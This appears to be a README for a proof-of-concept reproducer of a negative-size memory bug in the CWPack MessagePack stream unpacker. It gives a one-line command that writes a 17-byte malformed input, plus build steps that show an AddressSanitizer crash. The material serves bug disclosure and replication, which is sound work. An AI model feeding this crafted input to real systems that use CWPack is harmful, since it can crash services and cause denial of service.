# CWPack stream-unpack negative-size PoC

See ../CWPack-stream-unpack-negative-size.md for the full writeup and
../CWPack-REPLICATION.md for the step-by-step guide.

Files:
- `poc.c` — minimal consumer (init stream context + `cw_unpack_next` loop)
- `crash-minimal.bin` — **17-byte** minimal trigger (recommended); a `fixstr` header
  declaring 22 bytes with only 16 present. Regenerate with `make_payload.py`, or:
  `printf '\xb6\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' > crash-minimal.bin`
- `crash.bin` — the original 74-byte fuzzer input (same bug, `size=-4`)
- `make_payload.py` — regenerates `crash-minimal.bin` and prints the one-liner

```sh
git clone https://github.com/clwi/CWPack
clang -fsanitize=address -g -O1 -ICWPack/goodies/basic-contexts -ICWPack/src \
  poc.c CWPack/goodies/basic-contexts/basic_contexts.c CWPack/src/cwpack.c -o poc
./poc crash-minimal.bin   # -> AddressSanitizer: negative-size-param in handle_stream_unpack_underflow
```
